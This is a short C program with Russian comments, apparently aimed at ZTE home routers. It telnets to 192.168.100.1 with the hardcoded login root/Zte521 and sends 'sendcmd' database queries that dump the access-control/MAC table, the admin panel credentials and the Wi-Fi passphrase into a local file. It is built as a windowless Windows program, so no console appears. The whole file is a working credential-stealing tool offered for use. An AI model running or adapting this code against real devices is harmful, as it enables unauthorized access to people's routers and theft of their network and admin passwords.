#include "main.h"
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#if(_WIN32 || _WIN64)
    void iniz() //инициализация для Windows
    {
        WSADATA wsadata;
        if(WSAStartup(MAKEWORD(1,1), &wsadata)!=0)
        {
            printf("WSAStartup failed");
            exit(1);
        }
    }
    #define sockclose(d) closesocket(d)
#endif

#ifdef __linux__
    #define sockclose(d) close(d)
#endif

typedef struct logpass
{
    char *login;
    char *password;
    char *address;
} logpass;

void log_pass_set(logpass *s) // установка данных входа
{
    s->login = "root\r"; // в конце обязательно оставть "\r" !!!
    s->password = "Zte521\r"; // в конце обязательно оставть "\r" !!!
    s->address = "192.168.100.1";
}

int main()
{
    logpass *p = malloc(sizeof(logpass));
    log_pass_set(p);
    #if(_WIN32 || _WIN64)
	    iniz(); // подготовка к работе с сокетами
    #endif
    char buff[5120]; // буффер получаемых данных

    int d = socket(PF_INET, SOCK_STREAM, 0); // инициализация сокета
    if(d <= 0)
    {
        puts("Socket error!");
    }
//--------------------------------------------------------------
    struct sockaddr_in name;
    name.sin_family = PF_INET;
    name.sin_port = htons(23);
    name.sin_addr.s_addr = inet_addr(p->address);
    if(connect(d, (struct sockaddr *) &name, sizeof(name)) < 0)
    {
        printf("Connect error!\n");
    }
//--------------------------------------------------------------
    recv(d, buff, 5120, 0);
    printf("%s", buff);
	sleep(1);
    send(d, p->login, strlen(p->login), 0);
    recv(d, buff, 5120, 0);
    printf("%s", buff);
	sleep(1);
    send(d, p->password, strlen(p->password), 0);
    recv(d, buff, 5120, 0);
    printf("%s", buff);
    send(d, "sendcmd 1 DB p AclCfg\r", 22,0);
	sleep(1);
	int end = recv(d, buff, 5120, 0) - 1;
    buff[end] = '\0';
	
	FILE *f = fopen("info.txt", "w");
	fprintf(f,"___MAC___\n");
	fprintf(f, "%s", buff);

	fprintf(f, "\n\n----------------------------------\n___Login+Password Panel_____\n----------------------------------\n");
	send(d, "sendcmd 1 DB p DevAuthInfo\r", 27,0);
    sleep(1);
	end = recv(d, buff, 5120, 0) - 1;
    buff[end] = '\0';
    printf("%s", buff);
    fprintf(f, "%s", buff);    
	
    fprintf(f, "\n\n----------------------------------\n___Password Wi-Fi_____\n----------------------------------\\n");
	send(d, "sendcmd 1 DB p WLANPSK\r", 23,0);
    sleep(1);
	end = recv(d, buff, 5120, 0) - 1;
    buff[end] = '\0';
	fprintf(f, "%s", buff);
    printf("%s", buff);
    fclose(f);
	sockclose(d);
}
